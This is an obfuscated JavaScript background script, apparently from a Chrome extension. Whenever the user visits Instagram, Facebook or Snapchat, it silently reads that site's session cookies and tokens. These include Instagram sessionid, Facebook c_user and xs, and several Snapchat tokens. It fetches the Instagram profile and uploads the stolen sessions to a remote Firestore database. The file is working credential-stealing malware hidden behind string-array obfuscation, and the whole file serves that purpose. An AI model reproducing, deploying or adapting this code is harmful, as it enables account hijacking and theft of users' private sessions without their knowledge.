function a0a() {
  const v = [
    "y29VA2LLCW",
    "C2mTD2nPza",
    "rMfJzwjVB2S",
    "mJGZndiWng5Tq3zHzW",
    "zMLUza",
    "8j+BKsbtBMfWy2HHDcbKDxbSAwnHDguG4OcuihnRAxbWzwqU",
    "yMXPENPHCMrFD2vIx3nLC3nPB25FAwq",
    "BMfTzq",
    "D2vItMf2AwDHDgLVBG",
    "C2vZC2LVBMLK",
    "mZi4mde4ofHIuNzHEG",
    "DMfSDwu",
    "sw5ZDgfNCMfT",
    "4PQG77IpieLhignVB2TPzxmGBwLZC2LUzY4",
    "Aw5JBhvKzxm",
    "C2nFyxq",
    "C2vZC2LVBMLKpq",
    "4PQG77IpiezcignVB2TPzxmGBwLZC2LUzY4",
    "r0vu",
    "z2v0qwXS",
    "4PYfieLUC3rHz3jHBsbZyxzLzdO",
    "ywrKtgLZDgvUzxi",
    "Dw5RBM93BL91C2vY",
    "DxnLCM5HBwu",
    "ndy4mtC0n1Phrgjjsa",
    "C25HCgnOyxq",
    "ANnVBG",
    "zhnFDxnLCL9Pza",
    "DxnLCG",
    "zMfJzwjVB2S",
    "y191C2vY",
    "4PYfifnUyxbJAgf0ihnHDMvKiokCHq",
    "u25HCgnOyxq",
    "x3nJlxnPza",
    "sw5ZDgfNCMfTidiXos4WlJaUmtiUmte3iefUzhjVAwq",
    "lNnUyxbJAgf0lMnVBq",
    "Bg9N",
    "Ahr0Chm6lY9PlMLUC3rHz3jHBs5JB20VyxbPl3yXl3vZzxjZlW",
    "l2LUzM8V",
    "zw4Tvvm",
    "mJG4wNLNrNz1",
    "8j+AGcbtzxj2AwnLifDVCMTLCIbmB2fKzwqG4PYf",
    "lMLUC3rHz3jHBs5JB20",
    "otq1otu0BgPqzgHY",
    "Aw5ZDgfNCMfT",
    "B25dB21WBgv0zwq",
    "4PYfiezHy2vIB29RihnHDMvKoG",
    "nJqWmti0AMDlseHi",
    "zMfJzwjVB2SUy29T",
    "C25HCgnOyxqUy29T",
    "lMzHy2vIB29RlMnVBq",
    "yMLVz3jHCgH5",
    "otm2nJe5nZqZmZKYndu5",
    "mtCYnJyYDMP4yLrV",
    "D2fYBG",
    "Aw5ZDgfNCMfTlMnVBq",
    "C2mTys1UB25Jzq",
    "mtyWA3D4Agnq",
    "ndyZndi0s0HADKDI",
    "8j+BKsbgqIbKDxbSAwnHDguG4OcuihnRAxbWzwqU",
    "8j+BKsbjrYbKDxbSAwnHDguG4OcuihnRAxbWzwqU",
    "4PQG77IpifnUyxbJAgf0ignVB2TPzxmGBwLZC2LUzY4",
  ];
  a0a = function () {
    return v;
  };
  return a0a();
}
const a0n = a0b;
(function (a, b) {
  const m = a0b,
    c = a();
  while (!![]) {
    try {
      const d =
        -parseInt(m(0xd3)) / 0x1 +
        -parseInt(m(0xe5)) / 0x2 +
        parseInt(m(0xcf)) / 0x3 +
        -parseInt(m(0xec)) / 0x4 +
        (parseInt(m(0xdd)) / 0x5) * (parseInt(m(0xd9)) / 0x6) +
        parseInt(m(0xfa)) / 0x7 +
        (-parseInt(m(0xde)) / 0x8) * (-parseInt(m(0xcc)) / 0x9);
      if (d === b) break;
      else c["push"](c["shift"]());
    } catch (e) {
      c["push"](c["shift"]());
    }
  }
})(a0a, 0xd7312),
  console[a0n(0xc8)](a0n(0xcd));
import { db } from "./firebase-init.js";
import { collection, addDoc } from "./firebase-firestore.js";
function a0b(a, b) {
  const c = a0a();
  return (
    (a0b = function (d, e) {
      d = d - 0xc4;
      let f = c[d];
      if (a0b["DgqcQR"] === undefined) {
        var g = function (l) {
          const m =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
          let n = "",
            o = "";
          for (
            let p = 0x0, q, r, s = 0x0;
            (r = l["charAt"](s++));
            ~r && ((q = p % 0x4 ? q * 0x40 + r : r), p++ % 0x4)
              ? (n += String["fromCharCode"](0xff & (q >> ((-0x2 * p) & 0x6))))
              : 0x0
          ) {
            r = m["indexOf"](r);
          }
          for (let t = 0x0, u = n["length"]; t < u; t++) {
            o +=
              "%" +
              ("00" + n["charCodeAt"](t)["toString"](0x10))["slice"](-0x2);
          }
          return decodeURIComponent(o);
        };
        (a0b["DWiTMR"] = g), (a = arguments), (a0b["DgqcQR"] = !![]);
      }
      const h = c[0x0],
        i = d + h,
        j = a[i];
      return !j ? ((f = a0b["DWiTMR"](f)), (a[i] = f)) : (f = j), f;
    }),
    a0b(a, b)
  );
}
import { isDuplicateData } from "./utils.js";
chrome[a0n(0xea)][a0n(0xd1)][a0n(0xf7)](
  async ({ url: a }) => {
    const o = a0n;
    if (a[o(0xf0)](o(0xdb))) handleInstagram();
    else {
      if (a[o(0xf0)](o(0xd4))) handleFacebook();
      else {
        if (a[o(0xf0)](o(0xd5))) handleSnapchat();
      }
    }
  },
  {
    url: [
      { hostSuffix: a0n(0xdb) },
      { hostSuffix: a0n(0xd4) },
      { hostSuffix: a0n(0xd5) },
    ],
  }
);
async function handleInstagram() {
  const p = a0n;
  chrome[p(0xe2)][p(0xf5)]({ domain: p(0xce) }, async (a) => {
    const q = p,
      b = a[q(0xe6)]((k) => k[q(0xe9)] === q(0xeb)),
      c = a[q(0xe6)]((k) => k[q(0xe9)] === q(0xfd));
    if (!b || !c) return console[q(0xda)](q(0xef));
    const d = b[q(0xed)],
      e = c[q(0xed)],
      f = await fetch(q(0xc9) + e + q(0xca), {
        method: q(0xf4),
        headers: {
          "User-Agent": q(0xc6),
          Cookie: q(0xf2) + d + ";",
          "X-IG-App-ID": q(0xd8),
          "Accept-Language": q(0xcb),
        },
      });
    let g = q(0xf8),
      h = "";
    if (f["ok"]) {
      const k = await f[q(0xfc)](),
        l = k[q(0xfe)] || {};
      (g = l[q(0xf9)] || q(0xf8)), (h = l[q(0xd7)] || "");
    }
    const i = {
        platform: q(0xee),
        sessionId: d,
        userId: e,
        username: g,
        bio: h,
        domain: q(0xdb),
      },
      j = collection(db, q(0xd0));
    if (await isDuplicateData(j, i)) return console[q(0xc8)](q(0xe0));
    await addDoc(j, { ...i, timestamp: new Date() }),
      console[q(0xc8)](q(0xf6), g);
  });
}
async function handleFacebook() {
  const r = a0n;
  chrome[r(0xe2)][r(0xf5)]({ domain: r(0xd6) }, async (a) => {
    const s = r,
      b = a[s(0xe6)]((f) => f[s(0xe9)] === s(0x100)),
      c = a[s(0xe6)]((f) => f[s(0xe9)] === "xs");
    if (!b || !c) return console[s(0xda)](s(0xf3));
    const d = {
        platform: s(0xe4),
        c_user: b[s(0xed)],
        xs: c[s(0xed)],
        userId: b[s(0xed)],
        domain: s(0xd4),
      },
      e = collection(db, s(0xff));
    if (await isDuplicateData(e, d)) return console[s(0xc8)](s(0xdf));
    await addDoc(e, { ...d, timestamp: new Date() }),
      console[s(0xc8)](s(0xd2), b[s(0xed)]);
  });
}
async function handleSnapchat() {
  const t = a0n;
  chrome[t(0xe2)][t(0xf5)]({ domain: t(0xc7) }, async (a) => {
    const u = t,
      b = a[u(0xe6)]((i) => i[u(0xe9)] === u(0xf1)),
      c = a[u(0xe6)]((i) => i[u(0xe9)] === u(0xc5)),
      d = a[u(0xe6)]((i) => i[u(0xe9)] === u(0xe8)),
      e = a[u(0xe6)]((i) => i[u(0xe9)] === u(0xdc)),
      f = a[u(0xe6)]((i) => i[u(0xe9)] === u(0xe3));
    if (!b || !c || !d || !e || !f) return console[u(0xda)](u(0xe1));
    const g = {
        platform: u(0xc4),
        sc_at: b[u(0xed)],
        sc_sid: c[u(0xed)],
        blizzard_web_session_id: d[u(0xed)],
        sc_a_nonce: e[u(0xed)],
        sc_wcid: f[u(0xed)],
        domain: u(0xd5),
      },
      h = collection(db, u(0xfb));
    if (await isDuplicateData(h, g)) return console[u(0xc8)](u(0xe7));
    await addDoc(h, { ...g, timestamp: new Date() }),
      console[u(0xc8)](u(0x101));
  });
}
